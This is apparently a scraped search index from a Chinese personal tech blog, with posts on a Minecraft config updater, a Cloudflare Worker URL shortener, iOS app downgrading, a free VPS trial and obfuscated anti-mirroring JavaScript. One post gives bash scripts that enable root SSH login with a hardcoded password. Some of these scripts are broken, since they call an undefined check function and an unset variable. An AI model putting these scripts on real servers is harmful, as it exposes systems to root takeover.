hbox.Append(welcomeLabel, false) updateLabel := ui.NewLabel(\u0026#34;开始更新FDP配置\u0026#34;) vbox.Append(updateLabel, false) button := ui.NewButton(\u0026#34;更新配置文件\u0026#34;) button.OnClicked(func(*ui.Button) { downloadConfirmation() }) vbox.Append(button, false) mainwin.SetChild(vbox) mainwin.SetMargined(true) } func downloadConfirmation() { window := ui.NewWindow(\u0026#34;确认下载\u0026#34;, 100, 50, false) box := ui.NewVerticalBox() box.SetPadded(true) box.Append(ui.NewLabel(\u0026#34;确定要更新配置文件吗，可能会覆盖你的配置文件\u0026#34;), false) hbox := ui.NewHorizontalBox() hbox.SetPadded(true) box.Append(hbox, false) buttonYes := ui.NewButton(\u0026#34;Yes\u0026#34;) buttonYes.OnClicked(func(*ui.Button) { window.Destroy() configsDir := filepath.Join(\u0026#34;.minecraft\u0026#34;, \u0026#34;versions\u0026#34;, \u0026#34;FDP\u0026#34;, \u0026#34;FDPCLIENT-1.8\u0026#34;, \u0026#34;configs\u0026#34;) files, _ := os.ReadDir(configsDir) for _, file := range files { if strings.HasSuffix(file.Name(), \u0026#34;.json\u0026#34;) { os.Remove(filepath.Join(configsDir, file.Name())) } } downloadAllJSONs(\u0026#34;https://tr7mur567m8r6573n67.xpdbk.com/fite.txt\u0026#34;) }) hbox.Append(buttonYes, true) buttonNo := ui.NewButton(\u0026#34;No\u0026#34;) buttonNo.OnClicked(func(*ui.Button) { window.Destroy() }) hbox.Append(buttonNo, true) window.SetChild(box) window.Show() } func downloadAllJSONs(url string) { resp, err := http.Get(url) if err != nil { panic(err) } defer resp.Body.Close() body, err := io.ReadAll(resp.Body) if err != nil { panic(err) } jsonURLs := strings.Split(string(body), \u0026#34;\\n\u0026#34;) for _, jsonURL := range jsonURLs { jsonURL = strings.TrimSpace(jsonURL) if strings.HasSuffix(jsonURL, \u0026#34;.json\u0026#34;) { jsonFilename := filepath.Base(jsonURL) savePath := filepath.Join(\u0026#34;.minecraft\u0026#34;, \u0026#34;versions\u0026#34;, \u0026#34;FDP\u0026#34;, \u0026#34;FDPCLIENT-1.8\u0026#34;, \u0026#34;configs\u0026#34;, jsonFilename) downloadJSON(jsonURL, savePath) } } time.AfterFunc(100*time.Second, func() { os.Exit(0) }) } func downloadJSON(url string, savePath string) { resp, err := http.Get(url) if err != nil { panic(err) } defer resp.Body.Close() outFile, err := os.Create(savePath) if err != nil { panic(err) } defer outFile.Close() io.Copy(outFile, resp.Body) } func main() { ui.Main(setupUI) } 完\n","date":"2023-09-01T21:16:59+07:00","permalink":"https://blog.xpdbk.com/post/python-fdp-config-update/","title":"FDP配置外置更新器（源码公开）"},{"content":"前言 当我们自己用官方 Ubuntu服务器镜像 安装到服务器上面之后登录账号也只能登录当初安装并设置的账号并用sudo su命令提权，但是并没有root账户可以进行SSH登录，这是因为root账户创建之后每次开机都会随机密码且关闭SSH登录，所以我们去一个一个的用nano和vim改密码对我们来说一点都不方便。\nWindows全部都需要新建一个.txt文件之后改后缀保存为.sh文件并在linux上面./root.sh运行\nlinux 直接用nano或者vim创建一个root.sh并使用./运行即可\nｕｂｕｎｔｕ专属 只针对内网ubuntu（不要安全只要方便） 1 2 3 4 5 6 7 8 9 10 11 12 #!/bin/bash # 开启root权限 sed -i \u0026#39;s/#PermitRootLogin prohibit-password/PermitRootLogin yes/g\u0026#39; /etc/ssh/sshd_config # 设置root密码 echo \u0026#34;root:awa114514\u0026#34; | chpasswd # 重启sshd服务 systemctl restart sshd.service echo \u0026#34;SSH ROOT权限已开启并密码已更改为awa114514\u0026#34; 兼容所有linux发型版本的脚本 随手写的\n兼容所有linux发行版的正常脚本 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 #!/bin/bash # 检查 root 密码是否满足安全要求 if ! check_passwd; then echo \u0026#34;root 密码不安全，请重新设置 root 密码\u0026#34; exit 1 fi # 提示用户确认操作 read -p \u0026#34;确认开启 root 权限并设置 root 密码吗？(y/n) \u0026#34; answer if [[ $answer != \u0026#34;y\u0026#34; ]]; then echo \u0026#34;操作已取消\u0026#34; exit 1 fi # 检查系统类型 type=$(uname | tr \u0026#39;[:upper:]\u0026#39; \u0026#39;[:lower:]\u0026#39;) # 开启 root 权限 case $type in linux) sed -i \u0026#39;s/#PermitRootLogin prohibit-password/PermitRootLogin yes/g\u0026#39; /etc/ssh/sshd_config ;; *) echo \u0026#34;该脚本仅适用于 Linux 系统\u0026#34; exit 1 ;; esac # 设置 root 密码 echo \u0026#34;root:$password\u0026#34; | chpasswd # 重启 sshd 服务 systemctl restart sshd.service echo \u0026#34;SSH ROOT 权限已开启并密码已更改为 $password\u0026#34; 兼容 CentOS、Ubuntu、Arch 和 Debian 的脚本 随手写的\n兼容 CentOS、Ubuntu、Arch 和 Debian 的脚本 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 #!/bin/bash # 检查root密码是否满足安全要求 if ! check_passwd; then echo \u0026#34;root密码不安全，请重新设置root密码\u0026#34; exit 1 fi # 提示用户确认操作 read -p \u0026#34;确认开启root权限并设置root密码吗？(y/n) \u0026#34; answer if [[ $answer != \u0026#34;y\u0026#34; ]]; then echo \u0026#34;操作已取消\u0026#34; exit 1 fi # 检查操作系统 os=$(cat /etc/os-release | grep \u0026#34;PRETTY_NAME\u0026#34; | cut -d \u0026#39;=\u0026#39; -f 2 | tr -d \u0026#39;\u0026#34;\u0026#39;) # 开启root权限 case $os in \u0026#34;CentOS Linux\u0026#34;) sed -i \u0026#39;s/#PermitRootLogin prohibit-password/PermitRootLogin yes/g\u0026#39; /etc/ssh/sshd_config ;; \u0026#34;Ubuntu\u0026#34;) sed -i \u0026#39;s/#PermitRootLogin no/PermitRootLogin yes/g\u0026#39; /etc/ssh/sshd_config ;; \u0026#34;Arch Linux\u0026#34;) sed -i \u0026#39;s/#PermitRootLogin no/PermitRootLogin yes/g\u0026#39; /etc/ssh/sshd_config ;; \u0026#34;Debian\u0026#34;) sed -i \u0026#39;s/#PermitRootLogin prohibit-password/PermitRootLogin yes/g\u0026#39; /etc/ssh/sshd_config ;; esac # 设置root密码 echo \u0026#34;root:awa114514\u0026#34; | chpasswd # 重启sshd服务 systemctl restart sshd.service echo \u0026#34;SSH ROOT权限已开启并密码已更改为awa114514\u0026#34; ","date":"2023-09-01T08:49:19+07:00","permalink":"https://blog.xpdbk.com/post/linux-ssh-root-shell/","title":"一键设置ROOT账户访问SSH的脚本"},{"content":"前言 因为我的博客最初建站的时候就是用的wordpress所以我对DDOS攻击和CC攻击十分的了解并且经常关注，后来我陆续尝试了typecho和Halo等动态框架，最后jekyll到Hexo辗转来到了Hugo这个静态博客框架之后我才没有继续担心服务器和DDOS防护问题然后就是一直是没有忧虑的状态，直到最近的一个人来对我的网站实施了4天的恶性攻击之后才让我重视起了DDOS和CC的防护\n起源 在11点的晚上我正在刷着手机的时候一个邮件来了，给我说我的网站已经用了75GB的流量，我当时就在想什么东西用了这么多的流量？\n然后我就点进去一看，直接给我吓了一个激灵\n这我不管的话接下来肯定要关站啊，关站之后我肯定就没有收录了\n插曲 这个攻击者还给我的短链接服务塞一大堆的灰产链接，但是经过我的HTML注释，你访问我的 https://l.xpdbk.com 之后没办法向里面添加链接只有我能在后台添加，本来是想要公开使用的但是有这种人存在不得不私有\n采取动作 快马加鞭的加上了CF CDN，因为我之前为了照顾中国的用户所以我没打开CF CDN的小云朵，在WAF防火墙的低档之下，攻击者的所有流量都被消弱了\n最后 所有的流量都被化解掉了\n送给攻击者一句话：这个世界没有不劳而获的事情\n","date":"2023-08-29T13:58:11+07:00","permalink":"https://blog.xpdbk.com/post/ddos-blog-1/","title":"记一次博客被DDOS和非法攻击"},{"content":"如何用Cloudflare worker自建短链接服务 短链接又称短网址、短码，意思就是形式上比较短的网址，可以通过将一个普通的冗长的网址缩短生成一个新的较短的网址，便于分享传播。\n短链接主要应用场景如下：\n短信发送 短信里用短链接，可以极大减少字符，现在很多营销短信都是用的短网址。\n社群推广 很多社区或社交网站，会屏蔽长链接。微博字数限制，公众号关键字链接限制等，短网址可以缩短字符，规避掉这些限制。\n微信防屏蔽 微信里有各种屏蔽，用短链接可以避免暴露原有地址关键字，规避屏蔽。\n活码 短网址是固定的，可以通过修改原链接达到变更地址的作用，此时不用去修改固定的短网址，短网址就相当于一个中间层。主要用于替换更换链接成本较高的地方，比如生成好的二维码等。\n搭建 这里利用cloudflare workers提供的服务，免费版本每日100000次请求，对个人使用而言完全足够。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 const html404 = `\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;404 0.\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;0.\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt;` // const statichtml = \u0026#34;https://raw.githubusercontent.com/1x000/zdzy/main/duanlnk/index.html\u0026#34; async function randomString (len) { len = len || 6 let $chars = \u0026#39;ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678\u0026#39; /****默认去掉了容易混淆的字符oOLl,9gq,Vv,Uu,I1****/ let maxPos = $chars.length let result = \u0026#39;\u0026#39; for (i = 0; i \u0026lt; len; i++) { result += $chars.charAt(Math.floor(Math.random() * maxPos)) } return result } async function checkURL (URL) { let str = URL let Expression = /http(s)?:\\/\\/([\\w-]+\\.)+[\\w-]+(\\/[\\w- .\\/?%\u0026amp;=]*)?/ let objExp = new RegExp(Expression) return objExp.test(str) \u0026amp;\u0026amp; str[0] === \u0026#39;h\u0026#39; } async function save_url (URL, shortStr) { console.log(\u0026#34;shortStr:\u0026#34;, shortStr) let random_key if (!shortStr) { random_key = await randomString() } else { random_key = shortStr } let is_exist = await LINKS.get(random_key) console.log(is_exist) if (is_exist == null) { // 正常，直接放入 let stat = await LINKS.put(random_key, URL) if (typeof (stat) === \u0026#34;undefined\u0026#34;) return random_key else return stat } else if (!shortStr) { // 生成的random_key重复了，递归调用 return save_url(URL, null) } else // 自定义的路径已经存在了 return -1 } async function handleRequest (request) { console.log(request) if (request.method === \u0026#34;POST\u0026#34;) { let req = await request.json() console.log(req[\u0026#34;url\u0026#34;]) if (!await checkURL(req[\u0026#34;url\u0026#34;])) return new Response(`{\u0026#34;msg\u0026#34;:\u0026#34;0\u0026#34;}`, { status: 400, headers: { \u0026#34;Content-Type\u0026#34;: \u0026#34;application/json\u0026#34; } }) let random_key = await save_url(req[\u0026#34;url\u0026#34;], req[\u0026#34;shortStr\u0026#34;]) console.log(random_key) // 放成功了 if (Object.prototype.toString.call(random_key) === \u0026#34;[object String]\u0026#34;) return new Response(`{\u0026#34;data\u0026#34;:{\u0026#34;shortUrl\u0026#34;:\u0026#34;${random_key}\u0026#34;}}`, { status: 200, headers: { \u0026#34;Content-Type\u0026#34;: \u0026#34;application/json\u0026#34; } }) // 自定义的路径重复了 else if (random_key === -1) return new Response(`{\u0026#34;msg\u0026#34;:\u0026#34;0\u0026#34;}`, { status: 400, headers: { \u0026#34;Content-Type\u0026#34;: \u0026#34;application/json\u0026#34; } }) // 没测试k-v满了之后会怎么样，如果有错的话put时应该会有返回（猜测（懒 else return new Response(`{\u0026#34;msg\u0026#34;:\u0026#34;0\u0026#34;}`, { status: 500, headers: { \u0026#34;Content-Type\u0026#34;: \u0026#34;application/json\u0026#34; } }) } const requestURL = new URL(request.url) // todo 规范路径的\u0026#39;/\u0026#39; const path = requestURL.pathname.toString().substring(1); console.log(path) if (!path) { const html = await fetch(statichtml) return new Response(await html.text(), { headers: { \u0026#34;content-type\u0026#34;: \u0026#34;text/html;charset=UTF-8\u0026#34;, }, }) } const value = await LINKS.get(path) console.log(value) const location = value if (location) { return Response.redirect(location, 302) } // If request not in kv, return 404 return new Response(html404, { headers: { \u0026#34;content-type\u0026#34;: \u0026#34;text/html;charset=UTF-8\u0026#34;, }, status: 404 }) } addEventListener(\u0026#34;fetch\u0026#34;, async event =\u0026gt; { event.respondWith(handleRequest(event.request)) }) 解释 这段代码是一个可以用Cloudflare Workers和KV存储创建一个URL缩短服务的脚本。它允许用户输入一个长URL，然后得到一个可以重定向到原始URL的短URL。它还支持自定义短URL的路径。下面是一个如何使用这段代码的教程：\n创建一个Cloudflare账户和一个Workers订阅。你可以使用免费计划，每天允许最多10万次请求。\n在Workers控制台中创建一个KV命名空间，命名为LINKS。这个命名空间将用来存储短URL和长URL的映射关系。\n在Workers控制台中创建一个Worker，将这段代码粘贴到编辑器中。你可以修改代码中的一些变量，比如html404和statichtml，来自定义404页面和首页的内容。\n部署Worker，并选择一个域名，比如example.workers.dev。这个域名将作为你的URL缩短服务的地址。\n访问你的域名，你应该看到一个简单的网页，有一个输入框和一个按钮。你可以在输入框中输入一个长URL，然后点击按钮，就会得到一个短URL。你也可以在按钮旁边的输入框中输入一个自定义的路径，来指定你想要的短URL。如果自定义的路径已经被占用了，你会收到一个错误提示。\n你可以复制生成的短URL，并在浏览器中打开它，就会跳转到原始的长URL。你也可以分享这个短URL给其他人，让他们访问你想要分享的网页。\n警告 如果你要公开使用的话其中的HTML注释一定要去掉，如果你需要私有化的话请注释，因为总有人会往里面放写非法链接，导致域名出事\n","date":"2023-08-27T21:12:11+07:00","permalink":"https://blog.xpdbk.com/post/links-cloudflare-workers/","title":"如何用Cloudflare worker自建短链接服务"},{"content":"我的世界1.8.9版本材质包和音效包推荐2023 本文章的所有材质包的压缩文件\n蓝奏云 压缩密码: 114514gsG4\n访问密码: bwbq\nMD5：8DCFF9D27E70437E0DF636CA121275E9\n8X材质包（最正常的材质包） 自带方形字体和方块放置声，每个方块都做了处理，如果需要录屏什么的这个比较适合\n原名：Rodrigo's+Pack+(1.8)\n但是加上下面的天空覆盖包就不一样了\n千反田爱瑠天空覆盖包 适用于没有天空的材质包或者天空很简陋的材质包\n晚上\n白天\n16X材质包（最平庸的材质包） 不自带方形字体和方块放置声，只有个别方块都做了处理\n原名：§fggmen §8[16x]\n展示1\n展示2\n256X材质包（最好看的材质包） 不自带方形字体和方块放置声，只有个别方块都做了处理\n原名：! §a§lEmerald Pack §7§l[256x]\n2\n1\n三个材质包的视频 哈哈这些视频都不如照片来的详细\n8X 16X 256X 4个PVP音效包 胡桃音效包2.1（胡桃）\n打击音效玻璃（玻璃渣声）\nExhibition Soundpack（敲铁声）\n§l§6PVP §l§cSound Resource Kit（更多声音）\n后记 真好玩\n","date":"2023-08-24T22:16:17+07:00","image":"https://blog.xpdbk.com/post/caizhibao-1.8.9/2023-08-24_22.33.51_hub223830eea5237a2543d9291c2d1c443_64746_120x120_fill_q75_h2_box_smart1_2.webp","permalink":"https://blog.xpdbk.com/post/caizhibao-1.8.9/","title":"我的世界1.8.9版本材质包和音效包推荐2023"},{"content":"awa\n","date":"2023-08-17T17:31:31+07:00","permalink":"https://blog.xpdbk.com/post/laosat%E6%9C%BA%E9%A1%B6%E7%9B%92%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%A4%87%E4%BB%BD%E4%B8%8E%E5%9B%BA%E4%BB%B6%E7%BB%93%E6%9E%84%E7%A0%94%E7%A9%B6/","title":"LAOSAT机顶盒固件提取备份与固件结构研究"},{"content":"Python把图片批量转换为webp 需要Python 3.8.10，我不想使用在线转换awa\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import os import sys from PIL import Image def convert_to_webp(input_file, output_file, quality=80): try: with Image.open(input_file) as im: im.save(output_file, \u0026#34;webp\u0026#34;, quality=quality) print(f\u0026#34;Converted: {input_file} =\u0026gt; {output_file}\u0026#34;) except Exception as e: print(f\u0026#34;Error converting file: {input_file}\u0026#34;) print(str(e)) def process_folder(folder_path): for root, dirs, files in os.walk(folder_path): for filename in files: if any(filename.lower().endswith(ext) for ext in [\u0026#39;.jpg\u0026#39;, \u0026#39;.jpeg\u0026#39;, \u0026#39;.png\u0026#39;]): input_file = os.path.join(root, filename) output_file = os.path.splitext(input_file)[0] + \u0026#34;.webp\u0026#34; convert_to_webp(input_file, output_file) if __name__ == \u0026#34;__main__\u0026#34;: folder_path = os.path.dirname(sys.argv[0]) process_folder(folder_path) 注释版本 这段代码的功能是批量将文件夹内的JPG、JPEG和PNG图片转换为WEBP格式。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 import os # 处理文件和目录 import sys # 获取命令行参数 from PIL import Image # 处理图片 def convert_to_webp(input_file, output_file, quality=80): # 函数用于转换一个图片文件 # input_file: 输入的图片文件路径 # output_file: 输出的webp文件路径 # quality: webp文件质量,取值范围1-100,默认值80 try: # 打开输入图片文件 with Image.open(input_file) as im: # 保存为webp格式 im.save(output_file, \u0026#34;webp\u0026#34;, quality=quality) print(f\u0026#34;Converted: {input_file} =\u0026gt; {output_file}\u0026#34;) except Exception as e: # 捕获异常 print(f\u0026#34;Error converting file: {input_file}\u0026#34;) print(str(e)) def process_folder(folder_path): # 函数用于处理整个文件夹 # folder_path: 文件夹路径 for root, dirs, files in os.walk(folder_path): for filename in files: # 检查文件后缀是否为jpg/jpeg/png if any(filename.lower().endswith(ext) for ext in [\u0026#39;.jpg\u0026#39;, \u0026#39;.jpeg\u0026#39;, \u0026#39;.png\u0026#39;]): input_file = os.path.join(root, filename) output_file = os.path.splitext(input_file)[0] + \u0026#34;.webp\u0026#34; # 调用转换函数 convert_to_webp(input_file, output_file) if __name__ == \u0026#34;__main__\u0026#34;: # 获取当前脚本路径 folder_path = os.path.dirname(sys.argv[0]) process_folder(folder_path) 需要安装的库 以下是安装Pillow库的步骤:\n确保已经安装Python环境。\n打开命令提示符(Windows)或终端(Mac/Linux)。\n输入以下命令安装Pillow:\n1 pip install Pillow 安装成功后,可以导入Pillow库进行图像处理:\n1 from PIL import Image 如果遇到权限问题,可以使用sudo或加入管理员权限安装:\n1 sudo pip install Pillow 1 pip install Pillow --user 在Windows中,您有时需要使用pip install -U Pillow命令升级pip以安装Pillow。\nPillow还有一些依赖,所以在安装期间可能也需要安装这些依赖。\n示例安装命令:\nlinux系统/Mac: pip install Pillow Windows: pip install Pillow 或 pip install Pillow --user 主要步骤就是使用pip安装Pillow库,然后就可以在Python代码中导入 PIL包并使用Pillow了。\n后记 完美实现了转换webp的要求\n","date":"2023-08-07T19:59:13+07:00","permalink":"https://blog.xpdbk.com/post/python-img-to-webp/","title":"Python把图片转换为webp"},{"content":"前言 我为什么要降级？ 新版本APP太卡了\n新版本恶心人\n旧版本简单易用\n旧版本功能够用\n为什么要水这篇文章 自己正好有需求，也已经尝试过了 整合佬们的文章，也给自己存个档 教程 准备工作 下载这个降级软件（文章结尾链接） 第一步 打开这个IOS降级软件，同意防火墙和管理员权限\n第二步 在这里下载 iTunes\n如果你觉得慢的话你可以到我的蓝奏云下载\n安装 iTunes 的过程\nawa\n推荐设置\n这样更方便一点\n安装界面\n看到了这么复古的页面代表你搞对了\n打开iTunes并同意它的协议\n退出即可千万不要更新！！！\n进行一个登录操作（关闭其他抓包软件）\n实测开了抓包登录不了，请关闭开头的软件\n在你的IPhone上面同意登录并输入6位数验证码\n在右上角搜索你想要的应用\n下滑之后选择应用（不要点击下载）\n重新打开前面开头的软件然后在搜索APP里面输入同名关键词\n点击应用之后\n随便选一个版本号进入这个页面\n在iTunes点击下载之后就能下载了\n点击下载之后记得要看看资料库有没有东西\n好了我们通过右键-选择在windows资料管理器中打开 找到了IPA文件包\n第三步 安装爱思助手并导入IPA（百度上面一大把教程）\n非常简单\n程序来源文章 常见问题 问：iTunes 账号无法登录成功 请先关闭本工具，再进行 iTunes 登录操作。 登录成功后，再打开本工具即可。 问：iTunes对电脑进行授权时，授权不了，反复授权 关闭本工具，再进行授权即可。 下载地址 蓝奏：iOS旧版应用下载v5.2.zip iTunes v12.6.5.3 下载 64位 32位 后记 1、爱思助手里面也有每个APP的历史版本，也可以选择安装，但是通过爱思助手安装的历史版本无法通过App Store获取更新！\n2、所使用的iTunes一定是要12.6.3.6版本或者以下\n3、屏蔽更新：把下载好的ipa文件后缀名改为 .zip，打开之后，删除 iTunesMetadata.plist 文件（其他文件均受到签名保护，请勿修改，否则需要重新进行ipa签名），完成之后将文件后缀名改回 .ipa，然后用爱思或者在线安装就不会在App Store里面收到更新！\n","date":"2023-08-07T12:38:43+07:00","image":"https://blog.xpdbk.com/post/ios-app-download-old/photo_2023-08-07_12-41-41_hu91f58f32addccee32ba45597c0709dbf_50794_120x120_fill_q75_h2_box_smart1_2.webp","permalink":"https://blog.xpdbk.com/post/ios-app-download-old/","title":"IOSApp任意版本抓包降级教程"},{"content":" 在白嫖的VPS中，有需要验证信用卡的，也有不需要验证信用卡的，这篇教程就来和大家申请一台Linux One的IPv4 VPS\n准备材料 一个邮箱（最好是 gmail、QQ 之类的冷门邮箱实测我的 xiaopang@xpdbk.com 这种类型的邮箱也能注册） 申请流程 如果你才被封号，请换一个代理或者IP再次注册，不然你的邮箱会连跪\n使用本地网络打开注册页面，点击 Register 输入邮箱和名字、以及申请用途（尽量真实一点），然后点击 Request your trial 按钮 圈红圈的你可以用你的脑子想出最偏门的名字\n圈篮圈的必须和你所在地对应不然申请不过\n圈黑圈的理由必须要真实一点（我拿Linux打游戏）\n如果出现图中提示，即代表账户申请成功了 点击邮件中的链接激活账号 登录账户之后，另外一封邮件会提示账户到期时间。到时候还是可以使用同一邮箱继续注册续下去 点开之后按照顺序选择就行了 等待1-4分钟后，控制面板将会出现VPS的IP、登录用户名 体验 配置很好\n封号常见原因 大流量\nCPU占用长期满（不算）\n对网络IO占用时间过长\n总结 有IPV4有速度有配置\n容易封号嗝屁\n","date":"2023-08-01T22:15:20+07:00","image":"https://blog.xpdbk.com/post/ibm-linuxone-freevps/linux1_hub832ef2bff59f302c578748a32516eee_4816_120x120_fill_q75_h2_box_smart1_2.webp","permalink":"https://blog.xpdbk.com/post/ibm-linuxone-freevps/","title":"IBM LiuxOne服务器白嫖"},{"content":"昨天闲来无事在看谷歌分析统计出来的数据，看到了一条从来没见过的域名的引用，原本以为是那种采集站或者是谁参考了我的文章，打算去看看的，但是打开页面之后直接看到打开了我的博客（原封不动）。\n内容不能说一模一样吧，只能说连页面的结构都一样。见过采集的也见过参考的，但是还没见过整个站都反代过去的。。。\n一开始 本来以为站点是直接扒下来的，不打算管了之后，后来发现，是直接用 CloudFlare Worker 反代的，而且修改了 host 头，所以防盗链之类的操作基本上都没用了。。。\n经过Google之后发现可以用 JS 脚本来应对这种事情。\n刚开始的时候直接用 JS 判断窗口域名是否正确，不正确即跳转到正确的域名。\n代码如下 请放到Head里面\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 const validDomains = [ \u0026#39;blog.xpdbk.com\u0026#39;, \u0026#39;vlblog.xpdbk.com\u0026#39;, \u0026#39;lelfeng.netlify.app\u0026#39;, \u0026#39;cfblog.xpdbk.com\u0026#39;, \u0026#39;1x000.github.io\u0026#39;, \u0026#39;adaewfd321fg3.cachefly.net\u0026#39;, \u0026#39;127.0.0.1:1313\u0026#39;, \u0026#39;localhost:1313\u0026#39; ] try { if (validDomains.indexOf(document.location.hostname +\u0026#39;:\u0026#39;+ document.location.port) === -1) { window.location.href = \u0026#39;http://blog.xpdbk.com\u0026#39;; } } catch(e) {} 但是这个人不讲武德的通过反代把文件内的域名全部替换为了他的域名，就出现了死循环。\n后来通过 https://obfuscator.io/ 混淆的方式，把JS给混淆了，这样就防止了域名被修改。\n混淆后的示例代码如下：\n1 const _0x43eb42=_0x27a7;(function(_0xafca11,_0x40b2b8){const _0x35c55e=_0x27a7,_0x15b338=_0xafca11();while(!![]){try{const _0x517e5b=parseInt(_0x35c55e(0x188))/0x1*(parseInt(_0x35c55e(0x196))/0x2)+-parseInt(_0x35c55e(0x189))/0x3+-parseInt(_0x35c55e(0x18c))/0x4+parseInt(_0x35c55e(0x194))/0x5+parseInt(_0x35c55e(0x1a6))/0x6+-parseInt(_0x35c55e(0x19c))/0x7*(parseInt(_0x35c55e(0x1a3))/0x8)+-parseInt(_0x35c55e(0x19a))/0x9*(-parseInt(_0x35c55e(0x19d))/0xa);if(_0x517e5b===_0x40b2b8)break;else _0x15b338[\u0026#39;push\u0026#39;](_0x15b338[\u0026#39;shift\u0026#39;]());}catch(_0x6c5198){_0x15b338[\u0026#39;push\u0026#39;](_0x15b338[\u0026#39;shift\u0026#39;]());}}}(_0x17e0,0x5e4df));const _0x130d92=(function(){let _0x2e53a6=!![];return function(_0x323b74,_0x490435){const _0x1c497f=_0x2e53a6?function(){if(_0x490435){const _0x33bf80=_0x490435[\u0026#39;apply\u0026#39;](_0x323b74,arguments);return _0x490435=null,_0x33bf80;}}:function(){};return _0x2e53a6=![],_0x1c497f;};}()),_0x4b63bb=_0x130d92(this,function(){const _0x982257=_0x27a7;return _0x4b63bb[_0x982257(0x184)]()[_0x982257(0x192)](_0x982257(0x198))[_0x982257(0x184)]()[_0x982257(0x19f)](_0x4b63bb)[_0x982257(0x192)](_0x982257(0x198));});_0x4b63bb();const _0x3f0a06=(function(){let _0x2f2ee3=!![];return function(_0xf1a2dc,_0x12daa7){const _0x2c78dc=_0x2f2ee3?function(){if(_0x12daa7){const _0x1e1bbf=_0x12daa7[\u0026#39;apply\u0026#39;](_0xf1a2dc,arguments);return _0x12daa7=null,_0x1e1bbf;}}:function(){};return _0x2f2ee3=![],_0x2c78dc;};}()),_0x11b84d=_0x3f0a06(this,function(){const _0x5958bf=_0x27a7;let _0x1c1520;try{const _0x48284c=Function(_0x5958bf(0x18d)+_0x5958bf(0x18a)+\u0026#39;);\u0026#39;);_0x1c1520=_0x48284c();}catch(_0x560e71){_0x1c1520=window;}const _0x4777cb=_0x1c1520[\u0026#39;console\u0026#39;]=_0x1c1520[_0x5958bf(0x1a5)]||{},_0x10f092=[_0x5958bf(0x1a4),_0x5958bf(0x1a0),_0x5958bf(0x187),_0x5958bf(0x18b),_0x5958bf(0x19b),_0x5958bf(0x193),_0x5958bf(0x185)];for(let _0x41e094=0x0;_0x41e094\u0026lt;_0x10f092[_0x5958bf(0x190)];_0x41e094++){const _0xa11f57=_0x3f0a06[_0x5958bf(0x19f)][_0x5958bf(0x197)][\u0026#39;bind\u0026#39;](_0x3f0a06),_0x5853a5=_0x10f092[_0x41e094],_0x418439=_0x4777cb[_0x5853a5]||_0xa11f57;_0xa11f57[_0x5958bf(0x1a1)]=_0x3f0a06[\u0026#39;bind\u0026#39;](_0x3f0a06),_0xa11f57[_0x5958bf(0x184)]=_0x418439[_0x5958bf(0x184)][\u0026#39;bind\u0026#39;](_0x418439),_0x4777cb[_0x5853a5]=_0xa11f57;}});_0x11b84d();const validDomains=[_0x43eb42(0x191),_0x43eb42(0x195),_0x43eb42(0x18e),_0x43eb42(0x18f),_0x43eb42(0x19e),\u0026#39;adaewfd321fg3.cachefly.net\u0026#39;,_0x43eb42(0x186),\u0026#39;localhost:1313\u0026#39;];function _0x27a7(_0x30b2be,_0x27f11a){const _0x2f8ec1=_0x17e0();return _0x27a7=function(_0x11b84d,_0x3f0a06){_0x11b84d=_0x11b84d-0x183;let _0x2ded53=_0x2f8ec1[_0x11b84d];return _0x2ded53;},_0x27a7(_0x30b2be,_0x27f11a);}function _0x17e0(){const _0x30092e=[\u0026#39;__proto__\u0026#39;,\u0026#39;http://blog.xpdbk.com\u0026#39;,\u0026#39;248mjjPBK\u0026#39;,\u0026#39;log\u0026#39;,\u0026#39;console\u0026#39;,\u0026#39;2331390Rbmidg\u0026#39;,\u0026#39;location\u0026#39;,\u0026#39;toString\u0026#39;,\u0026#39;trace\u0026#39;,\u0026#39;127.0.0.1:1313\u0026#39;,\u0026#39;info\u0026#39;,\u0026#39;1hGmVnj\u0026#39;,\u0026#39;511494uNxHBt\u0026#39;,\u0026#39;{}.constructor(\\x22return\\x20this\\x22)(\\x20)\u0026#39;,\u0026#39;error\u0026#39;,\u0026#39;1689000vVCMXN\u0026#39;,\u0026#39;return\\x20(function()\\x20\u0026#39;,\u0026#39;lelfeng.netlify.app\u0026#39;,\u0026#39;cfblog.xpdbk.com\u0026#39;,\u0026#39;length\u0026#39;,\u0026#39;blog.xpdbk.com\u0026#39;,\u0026#39;search\u0026#39;,\u0026#39;table\u0026#39;,\u0026#39;2697315oyIMgb\u0026#39;,\u0026#39;vlblog.xpdbk.com\u0026#39;,\u0026#39;405444fEnPtY\u0026#39;,\u0026#39;prototype\u0026#39;,\u0026#39;(((.+)+)+)+$\u0026#39;,\u0026#39;hostname\u0026#39;,\u0026#39;422352iCyGvT\u0026#39;,\u0026#39;exception\u0026#39;,\u0026#39;119035WNGFBa\u0026#39;,\u0026#39;80LiPhiY\u0026#39;,\u0026#39;1x000.github.io\u0026#39;,\u0026#39;constructor\u0026#39;,\u0026#39;warn\u0026#39;];_0x17e0=function(){return _0x30092e;};return _0x17e0();}try{validDomains[\u0026#39;indexOf\u0026#39;](document[_0x43eb42(0x183)][_0x43eb42(0x199)]+\u0026#39;:\u0026#39;+document[_0x43eb42(0x183)][\u0026#39;port\u0026#39;])===-0x1\u0026amp;\u0026amp;(window[_0x43eb42(0x183)][\u0026#39;href\u0026#39;]=_0x43eb42(0x1a2));}catch(_0x573349){} 